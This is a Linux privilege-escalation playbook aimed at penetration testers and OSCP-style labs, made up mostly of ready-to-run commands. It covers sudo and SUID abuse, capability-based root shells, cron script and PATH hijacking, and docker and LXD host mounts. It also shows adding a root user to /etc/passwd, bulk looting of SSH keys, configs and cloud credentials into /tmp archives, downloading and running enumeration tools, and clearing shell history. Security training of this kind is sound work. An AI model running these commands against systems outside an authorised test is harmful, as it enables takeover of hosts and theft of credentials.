# Linux Privilege Escalation Playbook

Structured checklist for Linux privilege escalation covering rapid triage, enumeration, exploitation paths, and tooling. Replace placeholders (`<user>`, `<target>`, `<interface>`, `<ip>`) before running commands.

---

## Quick Triage Checklist
- Identify current user and host: `whoami`, `id`, `hostname`
- Inspect sudo rights: `sudo -l`
- Enumerate SUID/SGID binaries: `find / -perm -4000 -o -perm -2000 -type f 2>/dev/null`
- Check kernel/OS version: `uname -a`, `cat /etc/os-release`
- Review running processes and listening services: `ps aux`, `ss -tulpn`
- Search for credential artifacts: `grep -R "pass" /etc /opt /home 2>/dev/null`
- **Command bundle for fast context:**
  ```bash
  whoami; id; hostname
  sudo -l
  uname -a
  cat /etc/os-release
  ps aux | head
  ss -tulpn
  find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
  ```

---

## 1. Baseline Enumeration
- Confirm user, groups, and SELinux/AppArmor context: `id`, `getenforce`, `aa-status`
- Gather kernel, architecture, and OS release: `uname -a`, `cat /proc/version`, `cat /etc/os-release`
- Review environment variables for secrets and unusual paths: `env`, `cat ~/.bash_history`
- List network interfaces, routes, and listening sockets: `ip a`, `ip route`, `ss -tulnp`
- Inventory processes and services (note root-owned daemons): `ps faux`, `systemctl list-units --type=service --state=running`

### Automated helpers
- `linpeas.sh` – Comprehensive priv-esc audit (`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh`)
- `lse.sh` (Linux Smart Enumeration) – Adaptive checks (`./lse.sh -l2`)
- `les.sh` (Linux Exploit Suggester) – Kernel exploit suggestions (`./linux-exploit-suggester.sh`)
- `LinuxPrivChecker.py` – Simple rights/cron/suid review (`python3 LinuxPrivChecker.py`)

---

## 2. Credential & Secret Hunting
- Global sweep for sensitive strings (runs from `/`):  
  `grep -R "password\|pass\|secret\|token" / 2>/dev/null`
- Collect likely credential/config files for review:
  ```bash
  mkdir -p /tmp/loot-configs
  find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.env" -o -name "*.json" -o -name "config.php" -o -name "wp-config.php" \) \
    -exec cp --parents {} /tmp/loot-configs \; 2>/dev/null
  tar -czf /tmp/loot-configs.tgz -C /tmp loot-configs
  ```
- Copy SSH keys and known credential stores:
  ```bash
  mkdir -p /tmp/loot-keys
  find / -type f \( -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" -o -name "*.key" \) -exec cp --parents {} /tmp/loot-keys \; 2>/dev/null
  cp ~/.bash_history /tmp/loot-keys/bash_history 2>/dev/null
  ```
- Dump Docker/Kubernetes credentials when present:  
  `cp ~/.docker/config.json /tmp/loot-configs/docker-config.json 2>/dev/null`, `kubectl config view --raw > /tmp/loot-configs/kubeconfig.yaml 2>/dev/null`
- Quick find of OSCP-style flags: `find / -name "local.txt" -o -name "proof.txt" 2>/dev/null`

**Simple secret sweep command bundle:**
```bash
grep -R "password\|pass\|secret\|token" / 2>/dev/null | head
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.env" -o -name "*.json" \) -maxdepth 5 2>/dev/null | head
find / -type f -name "id_rsa" 2>/dev/null | head
find / -name "local.txt" -o -name "proof.txt" 2>/dev/null
```

---

## 3. Privilege Escalation Vectors

### 3.1 Sudo & SUID
- Enumerate sudo privileges (respect PATH, wildcards): `sudo -l`
- Identify SUID/SGID binaries for GTFObins abuse: `find / -perm -4000 -type f 2>/dev/null`, then check https://gtfobins.github.io/
- Detect world-writable SUID binaries: `find / -perm -4000 -type f -writable 2>/dev/null`
- Check for SUID shell or busybox binaries: `strings /path/to/binary | head`

**Example exploit – tar via sudo (no password required):**
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### 3.2 Capabilities
- List files with Linux capabilities set: `getcap -r / 2>/dev/null`
- Example: if `/usr/bin/python3 = cap_setuid+ep` → escalate with  
  `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`

### 3.3 Cron Jobs & Timers
- Inspect system-wide cron entries: `cat /etc/crontab`, `ls -l /etc/cron.*`
- Check user crontabs: `for u in $(cut -f1 -d: /etc/passwd); do crontab -u $u -l 2>/dev/null; done`
- For systemd timers: `systemctl list-timers --all`
- Exploit writable scripts executed by cron (overwrite with payload, wait for trigger).

### 3.4 Writable Paths & PATH Hijacking
- Find world-writable directories and files owned by root: `find / -writable -type d -maxdepth 3 2>/dev/null`
- Check `PATH` for writable entries: `echo $PATH`, `ls -ld $(echo $PATH | tr ":" " ")`
- Replace binaries executed by root if path order allows (`echo 'cp /bin/sh /tmp/sh && chmod +s /tmp/sh' > fakebinary`).

### 3.5 NFS & Shared Storage
- Review `/etc/exports` for `no_root_squash`: `cat /etc/exports`
- If mount allows root ownership, create SUID shell remotely:  
  `cp /bin/bash /mnt/nfs/shell && chmod +s /mnt/nfs/shell`
- For automounts, inspect `/etc/auto.*` and mounts under `/media`, `/mnt`, `/run`.

### 3.6 Containers & Virtualization
- Check group membership for `docker`, `lxd`, `podman`: `id`
- If in `docker`, spawn privileged container shell: `docker run -it --rm --privileged -v /:/host alpine chroot /host /bin/sh`
- For LXD:  
  ```bash
  lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine-rootfs
  lxc init alpine-rootfs ignite -c security.privileged=true -c security.nesting=true
  lxc config device add ignite hostdisk disk source=/ path=/mnt/root
  lxc start ignite && lxc exec ignite /bin/sh
  ```

### 3.7 Kernel Exploits
- Identify vulnerable kernels: `uname -r`, `cat /etc/issue`
- Use exploit suggesters (LES, `searchsploit linux kernel`).
- Compile and run exploits carefully; document exact CVE (e.g., `dirtycow`, `overlayfs`).

### 3.8 Network Services
- Scan localhost-available services for reuse: `ss -tulpn | grep 127.0.0.1`
- Forward ports for remote exploitation (e.g., SSH pivot): `ssh -L 8000:127.0.0.1:8000 user@host`
- Check for misconfigured root-owned daemons exposing management interfaces.

---

## 4. Monitoring & Process Discovery
- Run `pspy` to watch cron jobs and processes without root:  
  `wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O pspy64 && chmod +x pspy64 && ./pspy64`
- Use `inotifywait` to monitor file creation/changes: `inotifywait -m /tmp`
- Observe systemd journal for privileged operations: `journalctl -f`

---

## 5. Exploitation Examples
- **Writable service script (cron/systemd):**
  ```bash
  echo '#!/bin/bash' > /usr/local/bin/backup.sh
  echo 'cp /bin/bash /tmp/bashroot; chmod +s /tmp/bashroot' >> /usr/local/bin/backup.sh
  chmod +x /usr/local/bin/backup.sh
  # Wait for service/cron to execute
  /tmp/bashroot -p
  ```
- **PATH hijack via sudo:**
  ```bash
  echo '/bin/sh' > /tmp/service
  chmod +x /tmp/service
  PATH=/tmp:$PATH sudo service nginx restart
  ```
- **Exploiting writable `/etc/passwd`:**
  ```bash
  openssl passwd -1 -salt root pass123
  # Append to /etc/passwd
  echo 'root2:$1$root$SALT_HASH:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
  su root2
  ```

---

## 6. Persistence & Cleanup
- Confirm elevated access: `id`, `whoami`, `cat /etc/shadow` (readable now?)
- Capture proof files (e.g., `/root/proof.txt`, `/root/.bash_history` carefully).
- Remove uploaded tools and reverse modifications: `rm linpeas.sh`, restore overwritten scripts.
- Clear command history if engagement rules allow: `history -c`, remove `~/.bash_history`.
- Document exploited vector, commands executed, and cleanup actions.

---

## Tooling Reference
- linPEAS: https://github.com/carlospolop/PEASS-ng
- winPEAS.sh (drop onto Windows targets from Linux host): https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- Linux Smart Enumeration (lse): https://github.com/diego-treitos/linux-smart-enumeration
- Linux Exploit Suggester 2: https://github.com/jondonas/linux-exploit-suggester-2
- pspy: https://github.com/DominicBreuker/pspy
- GTFOBins: https://gtfobins.github.io/
- LES.sh: https://github.com/mzet-/linux-exploit-suggester
- BeRoot (Linux): https://github.com/AlessandroZ/BeRoot
